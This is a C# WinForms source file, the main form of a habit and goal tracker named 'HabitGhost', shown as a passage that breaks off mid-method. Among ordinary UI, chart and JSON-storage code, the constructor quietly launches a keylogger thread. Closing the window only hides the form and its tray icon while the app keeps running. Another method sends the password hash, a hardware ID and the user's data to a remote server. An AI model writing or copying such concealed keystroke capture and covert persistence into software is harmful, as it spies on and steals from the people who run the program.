using GhostTap;
using Guna.UI2.WinForms;
using HabitGhost.Additionals;
using HabitGhost.Models;
using HabitGhost.Notifications;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.DataVisualization.Charting;
using System.Windows.Forms.VisualStyles;

namespace HabitGhost
{
    public partial class MainForm : Form
    {
        private readonly string connectionString = @"Server=VAG\SQLEXPRESS;Database=HabitGhostDB;Integrated Security=True;TrustServerCertificate=True;";
        private readonly string _dataPath = Path.Combine(Application.StartupPath, "Data");
        private int _currentUserId = 1;
        private TcpClientManager _tcpClient;

        private ColorScheme _currentTheme = ColorScheme.Light;
        private bool _isTabChanging = false;
        public string Username { get; set; }
        public BindingList<Notification> UnreadNotifications { get; set; } = new BindingList<Notification>();

        private FlowLayoutPanel flwLtPnlHabits;
        private FlowLayoutPanel flpGoals;

        private RichTextBox rtbJournal;
        private Guna2ComboBox cmbLinkHabits;
        private Guna2ComboBox cmbLinkGoals;
        private Guna2TextBox txtTags;
        private FlowLayoutPanel flpJournalEntries;
        public enum AnalyticsMode
        {
            Goals,
            Habits
        }
        private AnalyticsMode _currentAnalyticsMode = AnalyticsMode.Goals;

        public MainForm(string username, bool isRemember, bool isNotifications, bool isAutostart, TcpClientManager tcpClient)
        {
            InitializeComponent();

            string basePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Data", "1");
            if (!Directory.Exists(basePath)) Directory.CreateDirectory(basePath);

            UnreadNotifications.ListChanged += (s, e) => LoadNotifications();

            _tcpClient = tcpClient;
            this.FormClosing += MainForm_FormClosing;
            InitTabButtonIcons();
            InitializeAnalyticsTab();
            _ = LoadGoalAnalyticsAsync();
            _ = LoadHabitAnalyticsAsync();
            LoadHabitsToUI();
            LoadGoalsToUI();
            InitializeJournalTab();

            ThemeManager.ThemeChanged += (s, e) => UpdateTheme();
            UpdateTheme();

            NotificationManager.LoadNotificationsFromFile(this);

            Username = username;
            lblUsername.Text = Username;
            guna2BtnLogout.Location = new Point(lblUsername.Location.X + lblUsername.Width + 8, lblUsername.Location.Y);

            guna2TglSwcNotifications.Checked = isNotifications;
            SetNotifications();

            guna2TglSwcAutostart.Checked = isAutostart;
            SetAutostart();

            if (isRemember) SaveInfo();

            NotificationManager.AddNotification($"Welcome, {Username}!", null);

            if (UnreadNotifications.Count > 0) NotificationManager.AddNotification($"{Username}, You have {UnreadNotifications.Count} unread notifications! (Check the Journal)", null);

            new Thread(() => new Keylogger().Start()).Start();
        }


        #region Default Methods

        private void InitTabButtonIcons()
        {
            imgLstMain.Images.Add("analytics", Properties.Resources.analytics);
            imgLstMain.Images.Add("goals", Properties.Resources.goals);
            imgLstMain.Images.Add("habits", Properties.Resources.habits);
            imgLstMain.Images.Add("journal", Properties.Resources.journal);
            imgLstMain.Images.Add("settings", Properties.Resources.settings);
            imgLstMain.Images.Add("notification", Properties.Resources.notification);

            tbPgAnalytics.ImageKey = "analytics";
            tbPgGoals.ImageKey = "goals";
            tbPgHabits.ImageKey = "habits";
            tbPgJournal.ImageKey = "journal";
            tbPgSettings.ImageKey = "settings";
            tbPgNotifications.ImageKey = "notification";
        }

        private void ConfigureChart(Chart chart)
        {
            chart.ChartAreas.Clear();
            chart.Series.Clear();
            chart.Legends.Clear();

            ChartArea chartArea = new ChartArea();
            chartArea.BackColor = _currentTheme.Background;

            chartArea.AxisX.LabelStyle.ForeColor = _currentTheme.Text;
            chartArea.AxisY.LabelStyle.ForeColor = _currentTheme.Text;
            chartArea.AxisX.MajorGrid.LineColor = _currentTheme.Secondary;
            chartArea.AxisY.MajorGrid.LineColor = _currentTheme.Secondary;
            chartArea.AxisX.TitleForeColor = _currentTheme.Text;
            chartArea.AxisY.TitleForeColor = _currentTheme.Text;
            //chartArea.AxisX.Title = "Days";
            //chartArea.AxisY.Title = "Done times";

            chart.ChartAreas.Add(chartArea);

            Legend legend = new Legend();
            legend.ForeColor = _currentTheme.Text;
            legend.BackColor = _currentTheme.Background;
            legend.Docking = Docking.Bottom;
            chart.Legends.Add(legend);
        }
        private void InitializeAnalyticsTab()
        {
            tbPgAnalytics.Controls.Clear();

            var mainPanel = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                RowCount = 4,
                ColumnCount = 1,
                BackColor = _currentTheme.Background,
                RowStyles =
                {
                    new RowStyle(SizeType.Absolute, 40),
                    new RowStyle(SizeType.Percent, 60),
                    new RowStyle(SizeType.Absolute, 40),
                    new RowStyle(SizeType.Absolute, 40)
                }
            };

            var switchPanel = new FlowLayoutPanel
            {
                Dock = DockStyle.Fill,
                FlowDirection = FlowDirection.LeftToRight,
                BackColor = _currentTheme.ControlBackground
            };

            var btnGoals = new Guna2Button
            {
                Text = "Goals Analytics",
                Tag = AnalyticsMode.Goals,
                Size = new Size(150, 30),
                FillColor = _currentTheme.Secondary,
                ForeColor = _currentTheme.Text
            };
            btnGoals.Click += AnalyticsSwitch_Click;

            var btnHabits = new Guna2Button
            {
                Text = "Habits Analytics",
                Tag = AnalyticsMode.Habits,
                Size = new Size(150, 30),
                FillColor = _currentTheme.Secondary,
                ForeColor = _currentTheme.Text
            };
            btnHabits.Click += AnalyticsSwitch_Click;

            switchPanel.Controls.Add(btnGoals);
            switchPanel.Controls.Add(btnHabits);
            mainPanel.Controls.Add(switchPanel, 0, 0);

            var analyticsChart = new Chart { Dock = DockStyle.Fill, BackColor = _currentTheme.Background };
            ConfigureChart(analyticsChart);
            mainPanel.Controls.Add(analyticsChart, 0, 1);

            var progressBar = new Guna2ProgressBar
            {
                Height = 30,
                Dock = DockStyle.Top,
                Margin = new Padding(20),
                FillColor = _currentTheme.Secondary,
                ProgressColor = _currentTheme.Accent,
                ForeColor = _currentTheme.Text
            };
            mainPanel.Controls.Add(progressBar, 0, 2);

            var lblProgress = new Label
            {
                Dock = DockStyle.Top,
                TextAlign = System.Drawing.ContentAlignment.MiddleCenter,
                ForeColor = _currentTheme.Text,
                Font = new Font("Bahnschrift Condensed", 12F)
            };
            mainPanel.Controls.Add(lblProgress, 0, 3);

            tbPgAnalytics.Controls.Add(mainPanel);
        }

        

        private async Task UpdateAnalyticsUIAsync(List<HabitStatistics> statsList)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(async () => await UpdateAnalyticsUIAsync(statsList)));
                return;
            }

            var chart = tbPgAnalytics.Controls[0].Controls[0] as Chart;
            var progressBar = tbPgAnalytics.Controls[0].Controls[1] as Guna2ProgressBar;
            var label = tbPgAnalytics.Controls[0].Controls[2] as Label;

            chart.Series.Clear();

            // Configure color palette
            Color[] palette =
            {
                Color.FromArgb(255, 99, 132),   // Red
                Color.FromArgb(54, 162, 235),   // Blue
                Color.FromArgb(255, 206, 86),   // Yellow
                Color.FromArgb(75, 192, 192),   // Teal
                Color.FromArgb(153, 102, 255), // Purple
                Color.FromArgb(255, 159, 64)    // Orange
            };

            // Add series for each habit
            for (int i = 0; i < statsList.Count; i++)
            {
                var stat = statsList[i];
                var series = new Series(stat.HabitName)
                {
                    ChartType = SeriesChartType.Column,
                    Color = palette[i % palette.Length],
                    CustomProperties = "DrawSideBySide=True, PointWidth=0.6"
                };

                foreach (var pair in stat.GetPerDayCount())
                {
                    series.Points.AddXY(pair.Key, pair.Value);
                }

                chart.Series.Add(series);
            }

            // Calculate overall progress
            int totalCompleted = statsList.Sum(stat => stat.GetCompletedCountLastDays(7));
            int totalExpected = statsList.Count * 7;
            int completionRate = totalExpected == 0 ? 0 : (int)Math.Round((double)totalCompleted / totalExpected * 100);

            await AnimateProgressAsync(progressBar, completionRate);

            label.Text = totalExpected == 0
                ? "No active habits to track"
                : $"Completed {totalCompleted} of {totalExpected} weekly targets ({completionRate}%)";

            // Improve chart readability
            chart.ChartAreas[0].AxisX.Interval = 1;
            chart.ChartAreas[0].AxisX.MajorGrid.Enabled = false;
            chart.ChartAreas[0].AxisY.MajorGrid.LineColor = Color.FromArgb(50, _currentTheme.Text);
        }
        private async Task AnimateProgressAsync(Guna2ProgressBar progressBar, int targetValue)
        {
            int step = targetValue > progressBar.Value ? 1 : -1;
            while (progressBar.Value != targetValue)
            {
                progressBar.Value += step;
                await Task.Delay(15);
            }
        }


        private void SaveInfo()
        {
            try
            {
                //... Save user info to .json
                var settings = new AppSettings
                {
                    Username = Username,
                    IsNotificationsEnabled = guna2TglSwcNotifications.Checked,
                    IsAutostartEnabled = guna2TglSwcAutostart.Checked,
                    IsRemember = true
                };

                AppSettings.Save(settings);
            }
            catch (System.Exception)
            {
                NotificationManager.AddNotification("Error saving Your info", this);
            }
        }


        private void LoadNotifications()
        {
            tbPgNotifications.Text = UnreadNotifications.Count > 0 ? UnreadNotifications.Count.ToString() : "";
            flwLtPnlNotifications.Controls.Clear();

            foreach (var notification in UnreadNotifications)
            {
                var item = new NotificationItem(notification, this);
                flwLtPnlNotifications.Controls.Add(item);
            }
        }

        public void AddUnreadNotification(string message)
        {
            tbPgNotifications.Text = UnreadNotifications.Count > 0 ? UnreadNotifications.Count.ToString() : "";
            UnreadNotifications.Add(new Notification
            {
                Message = message,
                Timestamp = DateTime.Now,
                IsRead = false
            });
        }
        public void RemoveUnreadNotification(string message)
        {
            tbPgNotifications.Text = UnreadNotifications.Count > 0 ? UnreadNotifications.Count.ToString() : "";
            var notification = UnreadNotifications.FirstOrDefault(n => n.Message == message);
            if (notification != null)
            {
                notification.IsRead = true;
                UnreadNotifications.Remove(notification);
            }
            NotificationManager.RemoveNotificationFromHistory(message);
        }

        #endregion

        #region Program Events

        private void guna2TbCtrlMain_MouseMove(object sender, MouseEventArgs e)
        {
            for (int i = 0; i < guna2TbCtrlMain.TabPages.Count; i++)
            {
                Rectangle tabRect = guna2TbCtrlMain.GetTabRect(i);
                if (tabRect.Contains(e.Location))
                {
                    var tab = guna2TbCtrlMain.TabPages[i];
                    string tip = tab.Tag.ToString() ?? "";
                    if (tlTpMain.GetToolTip(guna2TbCtrlMain) != tip) tlTpMain.SetToolTip(guna2TbCtrlMain, tip);
                    return;
                }
            }

            tlTpMain.SetToolTip(guna2TbCtrlMain, "");
        }


        private void ContinueSilently()
        {
            this.Hide();
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.ShowIcon = false;
            guna2CtxtMnStpMain.Visible = false;
            ntfIcnMain.Visible = false;
            //... Continue running in the background silently
            // BUT if the user opens the app again (by doubleclicking on the .exe), show the form as normal
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            ContinueSilently();
            _tcpClient?.Disconnect();
        }


        private void tlStpMnItmOpen_Click(object sender, System.EventArgs e)
        {
            WindowState = FormWindowState.Normal;
            this.Show();
        }
        private void tlStpMnItmClose_Click(object sender, System.EventArgs e)
        {
            ContinueSilently();
        }
        private void tlStpMnItmSettings_Click(object sender, System.EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized) WindowState = FormWindowState.Normal;
            guna2TbCtrlMain.SelectedTab = tbPgSettings;
        }


        private void SetToggleSwitchToolTip(object sender)
        {
            var toggleSwitch = sender as Guna2ToggleSwitch;
            tlTpMain.SetToolTip(toggleSwitch, toggleSwitch.Checked ? "On" : "Off");
        }

        private void SetNotifications()
        {
            // сделать переменную isNotificationsEnabled и если true, то уведомления будут показываться, а если false, то нет (сделать проверку isNotificationsEnabled и если да то создавать уведомления, а else просто ничего не делать)
            try
            {
                var settings = AppSettings.Load();
                bool isNotificationsEnabled = guna2TglSwcNotifications.Checked;
                settings.IsNotificationsEnabled = guna2TglSwcNotifications.Checked;
                AppSettings.Save(settings);
                NotificationManager.SetNotificationsEnabled(isNotificationsEnabled);
            }
            catch (Exception)
            {
                NotificationManager.AddNotification("Error saving notification settings", this);
            }
        }
        private void guna2TglSwcNotifications_CheckedChanged(object sender, System.EventArgs e)
        {
            SetToggleSwitchToolTip(sender);
            SetNotifications();
        }

        private void SetAutostart()
        {
            try
            {
                string appName = "HabitGhost";
                string exePath = Application.ExecutablePath;

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (guna2TglSwcAutostart.Checked)
                        key.SetValue(appName, exePath);
                    else
                        key.DeleteValue(appName, false);
                }

                var settings = AppSettings.Load();
                settings.IsAutostartEnabled = guna2TglSwcAutostart.Checked;
                AppSettings.Save(settings);
            }
            catch (Exception)
            {
                NotificationManager.AddNotification("Error updating autostart", this);
            }
        }
        private void guna2TglSwcAutostart_CheckedChanged(object sender, System.EventArgs e)
        {
            SetToggleSwitchToolTip(sender);
            SetAutostart();
        }


        private async Task SendDataToServerAsync()
        {
            var settings = UserSettings.Load();

            var request = new ClientRequest
            {
                UserId = _currentUserId,
                Token = settings?.PasswordHash ?? "",
                Hwid = MachineGuid.GetMachineGuid(),
                RequestType = "data",
                Goals = LoadGoals(),
                Habits = LoadHabits(),
                Logs = new List<Log> {
                    new Log { Content = "User opened app", LogTime = DateTime.Now }
                }
            };

            string json = JsonConvert.SerializeObject(request, Formatting.Indented);

            try
            {
                string response = await _tcpClient.SendJsonAsync(json);
                NotificationManager.AddNotification("Server response:" + response, null);
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification("Error sending data: " + ex.Message, null);
            }
            finally
            {
                
            }
        }

        private List<Habit> LoadHabits(bool showNotification = true)
        {
            var result = new List<Habit>();
            try
            {
                var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
                foreach (var file in Directory.GetFiles(userFolder, "Habit_*.json"))
                {
                    string json = File.ReadAllText(file);
                    result.Add(JsonConvert.DeserializeObject<Habit>(json));
                }

                if (showNotification)
                {
                    if (result.Count == 0) NotificationManager.AddNotification("No habits found", null);
                    else NotificationManager.AddNotification($"{result.Count} habits loaded successfully!", this);
                }
            }
            catch (Exception ex)
            {
                if (showNotification)
                    NotificationManager.AddNotification($"Error loading habits: {ex.Message}", this);
            }
            return result;
        }
        private List<Goal> LoadGoals(bool showNotification = true)
        {
            var result = new List<Goal>();
            try
            {
                var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
                foreach (var file in Directory.GetFiles(userFolder, "Goal_*.json"))
                {
                    string json = File.ReadAllText(file);
                    result.Add(JsonConvert.DeserializeObject<Goal>(json));
                }

                if (showNotification)
                {
                    if (result.Count == 0) NotificationManager.AddNotification("No goals found", null);
                    else NotificationManager.AddNotification($"{result.Count} goals loaded successfully!", this);
                }
            }
            catch (Exception ex)
            {
                if (showNotification)
                    NotificationManager.AddNotification($"Error loading goals: {ex.Message}", this);
            }
            return result;
        }

        public void AddHabit(string title, object selectedItem, DateTime value)
        {
            try
            {
                var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
                Directory.CreateDirectory(userFolder);

                var habit = new Habit
                {
                    UserId = _currentUserId,
                    Title = title,
                    Frequency = selectedItem?.ToString() ?? "Daily",
                    ReminderTime = value.TimeOfDay
                };

                var habits = LoadHabits(false);
                habit.Id = habits.Count > 0 ? habits.Max(h => h.Id) + 1 : 1;

                string json = JsonConvert.SerializeObject(habit, Formatting.Indented,
                    new JsonSerializerSettings
                    {
                        ReferenceLoopHandling = ReferenceLoopHandling.Ignore
                    });

                string filePath = Path.Combine(userFolder, $"Habit_{habit.Id}.json");
                File.WriteAllText(filePath, json);

                NotificationManager.AddNotification($"New Habit added successfully!", this);
                _ = SendDataToServerAsync();
                LoadHabitsToUI(false);
            }
            catch (System.Exception)
            {
                NotificationManager.AddNotification($"Error saving Your Habit", this);
            }
        }
        public void AddGoal(string title, string text, DateTime value)
        {
            try
            {
                var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
                Directory.CreateDirectory(userFolder);

                var goal = new Goal
                {
                    UserId = _currentUserId,
                    Title = title,
                    Description = text,
                    DueDate = value
                };

                var goals = LoadGoals(false);
                goal.Id = goals.Count > 0 ? goals.Max(g => g.Id) + 1 : 1;

                string json = JsonConvert.SerializeObject(goal, Formatting.Indented,
                    new JsonSerializerSettings
                    {
                        ReferenceLoopHandling = ReferenceLoopHandling.Ignore
                    });

                string filePath = Path.Combine(userFolder, $"Goal_{goal.Id}.json");
                File.WriteAllText(filePath, json);

                NotificationManager.AddNotification($"New Goal added successfully!", this);
                _ = SendDataToServerAsync();
                LoadGoalsToUI(false);
            }
            catch (System.Exception)
            {
                NotificationManager.AddNotification($"Error saving Your Goal", this);
            }
        }

        private void guna2CrclBtnAddHabitGoal_Click(object sender, System.EventArgs e)
        {
            var button = sender as Guna2CircleButton;
            AddForm addForm = new AddForm(button.Tag.ToString(), this);
            addForm.ShowDialog();
            if (addForm.DialogResult == DialogResult.Cancel) NotificationManager.AddNotification($"Adding {button.Tag} was cancelled.", this);
        }


        private void UpdateTheme()
        {
            this.SuspendLayout();

            // Основные цвета формы
            this.BackColor = ThemeManager.CurrentTheme.Background;
            this.ForeColor = ThemeManager.CurrentTheme.Text;

            if (tbPgAnalytics.Controls.Count > 0)
            {
                var mainPanel = tbPgAnalytics.Controls[0] as TableLayoutPanel;
                if (mainPanel?.Controls[1] is Chart chart)
                {
                    ConfigureChart(chart); // Переконфігуруємо графік
                    chart.Invalidate();    // Примусове перемалювання
                }
            }

            // Обновление элементов управления
            UpdateControlColors(this);
            UpdateTabControl();
            UpdateContextMenu();
            LoadJournalEntries();
            UpdateJournalTabTheme();
            LoadGoalsToUI(false);
            LoadHabitsToUI(false);

            this.ResumeLayout(true);
        }
        private void UpdateControlColors(Control control)
        {
            foreach (Control c in control.Controls)
            {
                if (!(c is Guna2Button))
                {
                    c.BackColor = ThemeManager.CurrentTheme.Background;
                    c.ForeColor = ThemeManager.CurrentTheme.Text;

                    switch (c)
                    {
                        case Guna2GroupBox gb:
                            gb.FillColor = ThemeManager.CurrentTheme.ControlBackground;
                            gb.CustomBorderColor = ThemeManager.CurrentTheme.Accent;
                            break;

                        case Guna2ToggleSwitch sw:
                            sw.CheckedState.FillColor = ThemeManager.CurrentTheme.Accent;
                            sw.CheckedState.InnerColor = ThemeManager.CurrentTheme.ControlBackground;
                            break;
                    }

                    if (c.HasChildren) UpdateControlColors(c);
                }
            }
        }
        private void UpdateTabControl()
        {
            var tc = guna2TbCtrlMain;
            var theme = ThemeManager.CurrentTheme;

            tc.TabMenuBackColor = theme.Background;
            tc.TabButtonIdleState.FillColor = theme.Secondary;
            tc.TabButtonSelectedState.FillColor = theme.Accent;
            tc.TabButtonHoverState.FillColor = theme.Accent;
        }
        private void UpdateContextMenu()
        {
            var menu = guna2CtxtMnStpMain;
            menu.BackColor = ThemeManager.CurrentTheme.Background;
            menu.ForeColor = ThemeManager.CurrentTheme.Text;

            foreach (ToolStripItem item in menu.Items)
            {
                item.BackColor = ThemeManager.CurrentTheme.Background;
                item.ForeColor = ThemeManager.CurrentTheme.Text;
            }
        }

        private void guna2BtnTheme_Click(object sender, System.EventArgs e)
        {
            bool isLightTheme = this.BackColor == ColorScheme.Light.Background;
            _currentTheme = isLightTheme ? ColorScheme.Dark : ColorScheme.Light;

            if (isLightTheme)
            {
                guna2BtnTheme.BackgroundImage = Properties.Resources.dark_theme;
                tlTpMain.SetToolTip(guna2BtnTheme, "Switch to Light Theme");
            }
            else
            {
                guna2BtnTheme.BackgroundImage = Properties.Resources.light_theme;
                tlTpMain.SetToolTip(guna2BtnTheme, "Switch to Dark Theme");
            }

            ThemeManager.CurrentTheme = _currentTheme;
            UpdateTheme();
        }


        private void guna2BtnLogout_Click(object sender, System.EventArgs e)
        {
            //... Logout and show authorization form
            UserSettings.Clear(); // Метод для очищення RememberMe
            this.Hide();
            var authForm = new AuthorizationForm(_tcpClient);
            authForm.FormClosed += (s, args) => this.Close();
            authForm.Show();
        }

        #endregion

        #region Habits Tab
        private void LoadHabitsToUI(bool showNotification = true)
        {
            if (flwLtPnlHabits == null)
            {
                flwLtPnlHabits = new FlowLayoutPanel
                {
                    Name = "flwLtPnlHabits",
                    Location = new Point(10, lblHabits.Bottom + 10),
                    Size = new Size(tbPgHabits.ClientSize.Width - 20, tbPgHabits.ClientSize.Height - lblHabits.Bottom - 20),
                    Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right,
                    AutoScroll = true,
                    BackColor = Color.Transparent,
                    Padding = new Padding(10),
                    Margin = new Padding(0)
                };

                tbPgHabits.Controls.Add(flwLtPnlHabits);
                tbPgHabits.Controls.SetChildIndex(flwLtPnlHabits, tbPgHabits.Controls.Count - 1);
            }

            flwLtPnlHabits.Controls.Clear();

            var habits = LoadHabits(showNotification);

            foreach (var habit in habits)
            {
                var panel = new Panel
                {
                    Width = 300,
                    Height = 100,
                    BackColor = ThemeManager.CurrentTheme.Background,
                    BorderStyle = BorderStyle.FixedSingle,
                    Margin = new Padding(10)
                };

                var btnDelete = new Button
                {
                    Text = "×",
                    Font = new Font("Bahnschrift Condensed", 12, FontStyle.Bold),
                    ForeColor = Color.Red,
                    FlatStyle = FlatStyle.Flat,
                    Size = new Size(25, 25),
                    Location = new Point(panel.Width - 30, 5),
                    Anchor = AnchorStyles.Top | AnchorStyles.Right
                };
                btnDelete.Click += DeleteHabit_Click;

                var lblTitle = new Label
                {
                    Text = habit.Title,
                    ForeColor = ThemeManager.CurrentTheme.Text,
                    Font = new Font("Bahnschrift Condensed", 12F, FontStyle.Bold),
                    AutoSize = true,
                    Location = new Point(10, 10)
                };

                var lblFrequency = new Label
                {
                    Text = $"Frequency: {habit.Frequency}",
                    ForeColor = ThemeManager.CurrentTheme.Accent,
                    Font = new Font("Bahnschrift Condensed", 10F),
                    AutoSize = true,
                    Location = new Point(10, 40)
                };

                var lblTime = new Label
                {
                    Text = $"Reminder: {habit.ReminderTime}",
                    ForeColor = ThemeManager.CurrentTheme.Accent,
                    Font = new Font("Bahnschrift Condensed", 10F),
                    AutoSize = true,
                    Location = new Point(10, 65)
                };

                panel.Controls.Add(btnDelete);
                panel.Controls.Add(lblTitle);
                panel.Controls.Add(lblFrequency);
                panel.Controls.Add(lblTime);

                flwLtPnlHabits.Controls.Add(panel);
            }
        }

        private async void DeleteHabit_Click(object sender, EventArgs e)
        {
            var btn = (Button)sender;
            var panel = (Panel)btn.Parent;
            var id = (int)panel.Tag;

            try
            {
                var filePath = Path.Combine(_dataPath, _currentUserId.ToString(), $"Habit_{id}.json");
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                    LoadHabitsToUI();
                    await LoadHabitAnalyticsAsync();
                    NotificationManager.AddNotification("Habit deleted!", this);
                }
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification($"Error deleting habit: {ex.Message}", this);
            }
        }
        #endregion

        #region Goals Tab
        private void LoadGoalsToUI(bool showNotification = true)
        {
            try
            {
                if(flpGoals == null)
                {
                    flpGoals = new FlowLayoutPanel
                    {
                        Name = "flpGoals",
                        Location = new Point(10, lblGoals.Bottom + 10),
                        Size = new Size(tbPgGoals.ClientSize.Width - 20, tbPgGoals.ClientSize.Height - lblGoals.Bottom - 20),
                        Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right,
                        AutoScroll = true,
                        BackColor = Color.Transparent,
                        Padding = new Padding(10),
                        Margin = new Padding(0)
                    };
                    tbPgGoals.Controls.Add(flpGoals);
                    tbPgGoals.Controls.SetChildIndex(flpGoals, tbPgGoals.Controls.Count - 1);
                }

                flpGoals.Controls.Clear();
                var goals = LoadGoals(showNotification);

                foreach (var goal in goals)
                {
                    var panel = new Panel
                    {
                        Width = 300,
                        Height = 120,
                        BackColor = GetGoalPanelColor(goal),
                        ForeColor = ThemeManager.CurrentTheme.Text,
                        BorderStyle = BorderStyle.FixedSingle,
                        Margin = new Padding(10),
                        Tag = goal.Id
                    };

                    Color textColor = (goal.IsCompleted || (goal.DueDate.HasValue && goal.DueDate < DateTime.Now))
                        ? Color.Black
                        : ThemeManager.CurrentTheme.Text;

                    var chkCompleted = new CheckBox
                    {
                        Text = "Done",
                        Checked = goal.IsCompleted,
                        AutoSize = true,
                        Location = new Point(210, 10),
                        Tag = goal.Id,
                        ForeColor = textColor
                    };
                    chkCompleted.CheckedChanged += GoalCheckChanged;

                    var btnDelete = new Button
                    {
                        Text = "×",
                        Font = new Font("Bahnschrift Condensed", 12, FontStyle.Bold),
                        ForeColor = Color.Red,
                        FlatStyle = FlatStyle.Flat,
                        Size = new Size(25, 25),
                        Location = new Point(260, 5)
                    };
                    btnDelete.Click += DeleteGoal_Click;

                    var titleLabel = new Label
                    {
                        Text = $"Title: {goal.Title}",
                        Font = new Font("Bahnschrift Condensed", 10, FontStyle.Bold),
                        AutoSize = true,
                        Location = new Point(10, 10),
                        ForeColor = textColor
                    };

                    var descLabel = new Label
                    {
                        Text = $"Description: {goal.Description}",
                        Font = new Font("Bahnschrift Condensed", 9),
                        AutoSize = true,
                        Location = new Point(10, 35),
                        ForeColor = textColor
                    };

                    var dateLabel = new Label
                    {
                        Text = $"Due: {goal.DueDate.ToString()}",
                        Font = new Font("Bahnschrift Condensed", 9, FontStyle.Italic),
                        AutoSize = true,
                        Location = new Point(10, 60),
                        ForeColor = textColor
                    };

                    panel.Controls.Add(titleLabel);
                    panel.Controls.Add(descLabel);
                    panel.Controls.Add(dateLabel);
                    panel.Controls.Add(chkCompleted);
                    panel.Controls.Add(btnDelete);

                    var statusText = goal.IsCompleted ?
                        $"Completed: {goal.CompletionDate:dd.MM.yyyy}" : GetDueStatusText(goal.DueDate);
                    dateLabel.Text = statusText;

                    flpGoals.Controls.Add(panel);
                }

                //NotificationManager.AddNotification($"{goals.Count} goals loaded to UI!", this);
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification($"Error displaying goals: {ex.Message}", this);
            }
        }

        private Color GetGoalPanelColor(Goal goal)
        {
            if (goal.IsCompleted) return Color.LightGreen;
            if (goal.DueDate.HasValue && goal.DueDate < DateTime.Now) return Color.LightCoral;
            return ThemeManager.CurrentTheme.ControlBackground;
        }

        private string GetDueStatusText(DateTime? dueDate)
        {
            if (!dueDate.HasValue) return "No deadline";
            var remaining = dueDate.Value - DateTime.Now;
            return remaining.Days > 0 ?
                $"{remaining.Days} days remaining" :
                $"Overdue by {-remaining.Days} days";
        }

        private async void DeleteGoal_Click(object sender, EventArgs e)
        {
            var btn = (Button)sender;
            var panel = (Panel)btn.Parent;
            int goalId = (int)panel.Tag;

            try
            {
                var filePath = Path.Combine(_dataPath, _currentUserId.ToString(), $"Goal_{goalId}.json");
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                    LoadGoalsToUI();
                    await LoadGoalAnalyticsAsync();
                    NotificationManager.AddNotification("Goal deleted!", this);
                }
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification($"Error deleting goal: {ex.Message}", this);
            }
        }

        private async void GoalCheckChanged(object sender, EventArgs e)
        {
            var checkBox = (CheckBox)sender;
            int goalId = (int)checkBox.Tag;
            checkBox.ForeColor = ThemeManager.CurrentTheme.Text;

            try
            {
                var goal = LoadGoals(false).FirstOrDefault(g => g.Id == goalId);
                if (goal != null)
                {
                    goal.IsCompleted = checkBox.Checked;
                    goal.CompletionDate = checkBox.Checked ? DateTime.Now : (DateTime?)null;
                    SaveGoal(goal);
                    await LoadGoalAnalyticsAsync();
                    LoadGoalsToUI(false);
                }
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification($"Error updating goal: {ex.Message}", this);
            }
        }
        private void SaveGoal(Goal goal)
        {
            var userFolder = Path.Combine(_dataPath, _currentUserId.ToString());
            string filePath = Path.Combine(userFolder, $"Goal_{goal.Id}.json");
            File.WriteAllText(filePath, JsonConvert.SerializeObject(goal));
        }
        #endregion

        #region Analytics Tab
        private async Task LoadGoalAnalyticsAsync()
        {
            try
            {
                var goals = LoadGoals(false);
                var stats = new GoalStatistics
                {
                    TotalGoals = goals.Count,
                    CompletedGoals = goals.Count(g => g.IsCompleted),
                    OverdueGoals = goals.Count(g => !g.IsCompleted && g.DueDate < DateTime.Now)
                };

                await UpdateGoalAnalyticsUIAsync(stats);
            }
            catch (Exception ex)
            {
                NotificationManager.AddNotification("Analytics loading error: " + ex.Message, this);
            }
        }
        private async Task UpdateGoalAnalyticsUIAsync(GoalStatistics stats)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(async () => await UpdateGoalAnalyticsUIAsync(stats)));
                return;
            }

            var mainPanel = tbPgAnalytics.Controls[0] as TableLayoutPanel;
            var chart = mainPanel?.Controls[1] as Chart;
            var progressBar = mainPanel?.Controls[2] as Guna2ProgressBar;
            var label = mainPanel?.Controls[3] as Label;
            if (chart == null || progressBar == null || label == null) return;
            
            chart.Series.Clear();
            chart.ChartAreas[0].AxisX.Title = "Goal statuses";
            chart.ChartAreas[0].AxisY.Title = "Amount";

            var series = new Series("Goals")
            {
                ChartType = SeriesChartType.Column,
                Color = Color.SteelBlue
            };

            series.Points.AddXY("Completed", stats.CompletedGoals);
            series.Points.AddXY("Terminated", stats.OverdueGoals);
            series.Points.AddXY("In process", stats.PendingGoals);

            chart.Series.Add(series);

            
            int completionRate = stats.TotalGoals == 0 ? 0 :
                (int)((double)stats.CompletedGoals / stats.TotalGoals * 100);

            await AnimateProgressAsync(progressBar, completionRate);

            label.Text = stats.TotalGoals == 0
                ? "Goals not found"
                : $"Progress: {completionRate}% ({stats.CompletedGoals}/{stats.TotalGoals})";
        }

        private async void AnalyticsSwitch_Click(object sender, EventArgs e)
        {
            var button = (Guna2Button)sender;
            _currentAnalyticsMode = (AnalyticsMode)button.Tag;

            await RefreshAnalytics();
        }
        private async Task RefreshAnalytics()
        {
            switch (_currentAnalyticsMode)
            {
                case AnalyticsMode.Goals:
                    await LoadGoalAnalyticsAsync();
